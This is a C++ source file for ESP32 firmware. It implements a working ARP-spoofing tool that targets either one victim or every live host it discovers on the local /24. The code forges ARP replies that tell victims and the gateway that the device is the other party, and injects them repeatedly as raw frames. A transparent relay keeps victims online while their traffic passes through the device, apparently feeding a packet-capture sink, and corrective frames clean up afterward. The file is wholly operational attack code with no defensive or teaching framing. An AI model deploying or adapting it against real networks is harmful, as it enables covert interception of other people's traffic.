#include "arpspoof.h"
#include <WiFi.h>
#include <ArduinoJson.h>
#include <vector>
#include "../common/iprange.h"   // ipToU32
#include "nettap.h"              // shared RX hook: transparent relay

extern "C" {
    #include "esp_wifi.h"
    #include "esp_netif.h"
    #include "esp_netif_net_stack.h"
    #include "esp_private/wifi.h" // esp_wifi_internal_tx (ARP injection)
    #include "lwip/etharp.h"
    #include "lwip/netif.h"
    #include "lwip/tcpip.h" // LOCK_TCPIP_CORE/UNLOCK_TCPIP_CORE
}

namespace {
    struct Victim { IPAddress ip; uint8_t mac[6]; };

    volatile bool g_running = false;
    volatile bool g_stopReq = false;
    String g_mode = "single";          // "single" | "all"
    String g_phase = "poisoning";       // "discovering" | "poisoning"
    volatile uint32_t g_discoverDone = 0;
    uint32_t g_discoverTotal = 0;

    IPAddress g_gateway;
    uint8_t g_gatewayMac[6] = {0};
    uint8_t g_ourMac[6] = {0};
    std::vector<Victim> g_victims;
    volatile uint32_t g_sent = 0;
    SemaphoreHandle_t g_mtx = nullptr;
    TaskHandle_t g_task = nullptr;

    String macStr(const uint8_t *m) {
        char buf[18];
        snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X", m[0], m[1], m[2], m[3], m[4], m[5]);
        return String(buf);
    }

    struct netif *getStaNetif() {
        esp_netif_t *e = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
        if (e) return (struct netif *)esp_netif_get_netif_impl(e);
        return netif_default;
    }

    // Snapshots the current victim table into NetTap and turns the
    // transparent relay on (so poisoned victims keep working). The relay
    // itself lives in NetTap (shared with pcap's capture sink).
    void enableRelay() {
        std::vector<NetTap::Victim> v;
        if (g_mtx) xSemaphoreTake(g_mtx, portMAX_DELAY);
        for (auto &x : g_victims) {
            NetTap::Victim nv; nv.ip = ipToU32(x.ip); memcpy(nv.mac, x.mac, 6);
            v.push_back(nv);
        }
        if (g_mtx) xSemaphoreGive(g_mtx);
        NetTap::configureRelay(WiFi.localIP(), g_ourMac, g_gateway, g_gatewayMac,
                               WiFi.subnetMask(), v.data(), (int)v.size());
        NetTap::relayEnable(true);
    }

    // See the matching comment in recon/arpscan.cpp: etharp_find_addr()/
    // etharp_request() must be called with the lwIP TCPIP core lock held
    // when called from outside the lwIP thread, or ESP-IDF's lwIP build
    // asserts and reboots the device.
    bool resolveMac(struct netif *nif, const IPAddress &ip, uint8_t out[6], int attempts) {
        ip4_addr_t target;
        ip4_addr_set_u32(&target, (uint32_t)ip);

        for (int attempt = 0; attempt < attempts; ++attempt) {
            struct eth_addr *ethRet = nullptr;
            const ip4_addr_t *ipRet = nullptr;

            LOCK_TCPIP_CORE();
            bool found = etharp_find_addr(nif, &target, &ethRet, &ipRet) >= 0 && ethRet;
            if (found) memcpy(out, ethRet->addr, 6);
            UNLOCK_TCPIP_CORE();
            if (found) return true;

            LOCK_TCPIP_CORE();
            etharp_request(nif, &target);
            UNLOCK_TCPIP_CORE();
            vTaskDelay(pdMS_TO_TICKS(attempt == 0 ? 200 : 50));
        }
        return false;
    }

    void buildArp(uint8_t *f, const uint8_t *dstMac, const uint8_t *srcMac, uint16_t op,
                  const IPAddress &senderIp, const uint8_t *senderMac,
                  const IPAddress &targetIp, const uint8_t *targetMac) {
        memcpy(f, dstMac, 6);
        memcpy(f + 6, srcMac, 6);
        f[12] = 0x08; f[13] = 0x06;
        f[14] = 0x00; f[15] = 0x01;
        f[16] = 0x08; f[17] = 0x00;
        f[18] = 6; f[19] = 4;
        f[20] = (op >> 8) & 0xFF; f[21] = op & 0xFF;
        memcpy(f + 22, senderMac, 6);
        f[28] = senderIp[0]; f[29] = senderIp[1]; f[30] = senderIp[2]; f[31] = senderIp[3];
        memcpy(f + 32, targetMac, 6);
        f[38] = targetIp[0]; f[39] = targetIp[1]; f[40] = targetIp[2]; f[41] = targetIp[3];
    }

    void inject(const uint8_t *frame) {
        esp_wifi_internal_tx(WIFI_IF_STA, (void *)frame, 42);
    }

    void poisonOnce(const Victim &v) {
        uint8_t frame[42];
        // Tell the victim: "the gateway is me".
        buildArp(frame, v.mac, g_ourMac, 2, g_gateway, g_ourMac, v.ip, v.mac);
        inject(frame);
        // Tell the gateway: "this victim is me".
        buildArp(frame, g_gatewayMac, g_ourMac, 2, v.ip, g_ourMac, g_gateway, g_gatewayMac);
        inject(frame);
        g_sent += 2;
    }

    void healOnce(const Victim &v) {
        uint8_t fix[42];
        buildArp(fix, v.mac, g_gatewayMac, 2, g_gateway, g_gatewayMac, v.ip, v.mac);
        inject(fix);
        buildArp(fix, g_gatewayMac, v.mac, 2, v.ip, v.mac, g_gateway, g_gatewayMac);
        inject(fix);
    }

    // Discovers every other live host on the local /24 via ARP (no ICMP),
    // excluding our own IP and the gateway. Reports progress via
    // g_discoverDone/g_discoverTotal. Split across a worker pool (same
    // pattern as recon/arpscan.cpp) since resolving 254 hosts one at a
    // time, each with up to 3 request/retry rounds, can take the better
    // part of a minute.
    const int NUM_DISCOVER_WORKERS = 6;
    volatile int g_discoverWorkersAlive = 0;
    IPAddress g_discoverSelf, g_discoverBase;
    struct netif *g_discoverNif = nullptr;

    struct DiscoverRange { int start, end; };

    void discoverWorker(void *arg) {
        DiscoverRange range = *(DiscoverRange *)arg;
        delete (DiscoverRange *)arg;

        for (int h = range.start; h < range.end && !g_stopReq; ++h) {
            IPAddress ip(g_discoverBase[0], g_discoverBase[1], g_discoverBase[2], h);
            if (ip != g_discoverSelf && ip != g_gateway) {
                uint8_t mac[6];
                if (resolveMac(g_discoverNif, ip, mac, 3)) {
                    if (g_mtx) xSemaphoreTake(g_mtx, portMAX_DELAY);
                    g_victims.push_back({ip, {mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]}});
                    if (g_mtx) xSemaphoreGive(g_mtx);
                }
            }
            g_discoverDone++;
        }

        if (g_mtx) xSemaphoreTake(g_mtx, portMAX_DELAY);
        g_discoverWorkersAlive--;
        if (g_mtx) xSemaphoreGive(g_mtx);
        vTaskDelete(nullptr);
    }

    void discoverVictims(struct netif *nif) {
        g_discoverSelf = WiFi.localIP();
        IPAddress mask = WiFi.subnetMask();
        g_discoverBase = IPAddress(g_discoverSelf[0] & mask[0], g_discoverSelf[1] & mask[1], g_discoverSelf[2] & mask[2], 0);
        g_discoverNif = nif;

        g_discoverDone = 0;
        g_discoverTotal = 254;
        g_victims.clear();

        int workers = NUM_DISCOVER_WORKERS;
        g_discoverWorkersAlive = workers;
        int perWorker = (254 + workers - 1) / workers;
        for (int w = 0; w < workers; ++w) {
            int s = 1 + w * perWorker;
            int e = s + perWorker < 255 ? s + perWorker : 255;
            if (s >= e) { g_discoverWorkersAlive--; continue; }
            DiscoverRange *r = new DiscoverRange{s, e};
            xTaskCreatePinnedToCore(discoverWorker, "arpspoof-disc", 4096, r, 1, nullptr, w % 2);
        }
        while (g_discoverWorkersAlive > 0) vTaskDelay(pdMS_TO_TICKS(100));
    }

    void spoofTask(void *) {
        struct netif *nif = getStaNetif();

        if (g_mode == "all") {
            g_phase = "discovering";
            if (nif) discoverVictims(nif);
            g_phase = "poisoning";
        }

        // Start relaying before we begin poisoning so victims stay online.
        enableRelay();

        while (!g_stopReq) {
            if (g_mtx) xSemaphoreTake(g_mtx, portMAX_DELAY);
            std::vector<Victim> snapshot = g_victims;
            if (g_mtx) xSemaphoreGive(g_mtx);

            for (auto &v : snapshot) poisonOnce(v);
            vTaskDelay(pdMS_TO_TICKS(2000));
        }

        // Stop relaying (the RX hook stays installed but goes transparent).
        NetTap::relayEnable(false);

        // Corrective frames: restore every poisoned cache with real MACs.
        if (g_mtx) xSemaphoreTake(g_mtx, portMAX_DELAY);
        std::vector<Victim> snapshot = g_victims;
        if (g_mtx) xSemaphoreGive(g_mtx);
        for (int i = 0; i < 5; ++i) {
            for (auto &v : snapshot) healOnce(v);
            vTaskDelay(pdMS_TO_TICKS(200));
        }

        g_running = false;
        g_task = nullptr;
        vTaskDelete(nullptr);
    }
}

namespace ArpSpoof {

bool start(const IPAddress &victim, const IPAddress &gateway) {
    if (g_running) return false;
    if (WiFi.status() != WL_CONNECTED) return false;
    if (!g_mtx) g_mtx = xSemaphoreCreateMutex();

    struct netif *nif = getStaNetif();
    if (!nif) return false;

    g_gateway = gateway;
    WiFi.macAddress(g_ourMac);

    uint8_t victimMac[6];
    if (!resolveMac(nif, victim, victimMac, 10)) {
        Serial.printf("[ARP] Failed to resolve victim MAC %s\n", victim.toString().c_str());
        return false;
    }
    if (!resolveMac(nif, gateway, g_gatewayMac, 10)) {
        Serial.printf("[ARP] Failed to resolve gateway MAC %s\n", gateway.toString().c_str());
        return false;
    }

    g_victims.clear();
    g_victims.push_back({victim, {victimMac[0], victimMac[1], victimMac[2], victimMac[3], victimMac[4], victimMac[5]}});

    g_mode = "single";
    g_phase = "poisoning";
    g_sent = 0;
    g_stopReq = false;
    g_running = true;
    xTaskCreatePinnedToCore(spoofTask, "arpspoof", 4096, nullptr, 1, &g_task, 0);
    return true;
}

bool startAll() {
    if (g_running) return false;
    if (WiFi.status() != WL_CONNECTED) return false;
    if (!g_mtx) g_mtx = xSemaphoreCreateMutex();

    struct netif *nif = getStaNetif();
    if (!nif) return false;

    g_gateway = WiFi.gatewayIP();
    WiFi.macAddress(g_ourMac);

    if (!resolveMac(nif, g_gateway, g_gatewayMac, 10)) {
        Serial.printf("[ARP] Failed to resolve gateway MAC %s\n", g_gateway.toString().c_str());
        return false;
    }

    g_victims.clear();
    g_mode = "all";
    g_phase = "discovering";
    g_sent = 0;
    g_stopReq = false;
    g_running = true;
    xTaskCreatePinnedToCore(spoofTask, "arpspoof-all", 4096, nullptr, 1, &g_task, 0);
    return true;
}

void stop() { g_stopReq = true; }

String status() {
    JsonDocument doc;
    doc["running"] = g_running;
    doc["mode"] = g_mode;
    doc["phase"] = g_phase;
    doc["gateway"] = g_gateway.toString();
    doc["gatewayMac"] = macStr(g_gatewayMac);
    doc["discoverDone"] = g_discoverDone;
    doc["discoverTotal"] = g_discoverTotal;
    doc["sent"] = g_sent;
    doc["relay"] = NetTap::relayActive();
    doc["forwarded"] = NetTap::forwarded();

    JsonArray arr = doc["victims"].to<JsonArray>();
    if (g_mtx) xSemaphoreTake(g_mtx, portMAX_DELAY);
    for (auto &v : g_victims) {
        JsonObject o = arr.add<JsonObject>();
        o["ip"] = v.ip.toString();
        o["mac"] = macStr(v.mac);
    }
    if (g_mtx) xSemaphoreGive(g_mtx);

    String out;
    serializeJson(doc, out);
    return out;
}

} // namespace ArpSpoof
